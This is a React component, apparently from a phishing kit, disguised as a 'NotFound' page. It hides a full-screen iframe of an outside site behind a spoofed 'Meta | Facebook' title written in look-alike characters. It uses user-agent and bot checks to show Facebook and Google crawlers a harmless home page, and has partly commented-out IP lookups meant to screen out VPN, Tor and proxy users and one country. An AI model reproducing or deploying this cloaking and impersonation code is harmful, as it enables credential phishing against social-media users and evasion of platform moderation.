import React, { useEffect, useState } from "react";
import { isbot } from "isbot";
import { Helmet } from 'react-helmet';

function NotFound() {
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);
  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-ozki.onrender.com');
  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μеtа | Fасеbοоk');
  let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');


  function showIframe(file,title,favicon) {
    const html = (
      <>
      <Helmet>
          <title>{title}</title>
          {favicon ? 
          <link rel="icon" type="image/svg+xml" href="./favicon2.ico"/>
           :
           null
          }
      </Helmet>
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    return html;
  }
 
  const setLocaltion =  () => {
    try {

      


      fetch("https://api64.ipify.org/?format=json").then(d => d.json()).then(d => {
        var ipAddress = d.ip;
        if(ipAddress){
          fetch(`https://ipinfo.io/widget/demo/${ipAddress}`).then(d => d.json().data).then(d => {
          console.log(d);
          // var countryCode = d.country;
          // var privacy = d.privacy;
          // if(privacy){
          //   if(
          //     privacy.vpn == true
          //     || privacy.hosting == true
          //     || privacy.relay == true
          //     || privacy.tor == true
          //     || privacy.proxy == true
          //   ){
          //     SetUserHiden(true);
          //   }
          //}
          //setCountryCode(countryCode.toLowerCase());
        });
          
        }
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google') 
    && !isbot(userAgent)){
    if(IsUserHiden){
      return(showIframe("home.html",SiteTitleHome,false));
    }else{
      if(countryCode.length == 0){
        return(           
          <div className="loading">
              <div className="loader"></div>
          </div>
        );
      }else{
        if(countryCode.includes('vn')){
          return(showIframe("home.html",SiteTitleHome,false));
        }else{
          return(showIframe(IframeUrl,SiteTitleMeta,true));
        }
      }
    }
  }else{
    return(showIframe("home.html",SiteTitleHome,false));
  }
}

export default NotFound;
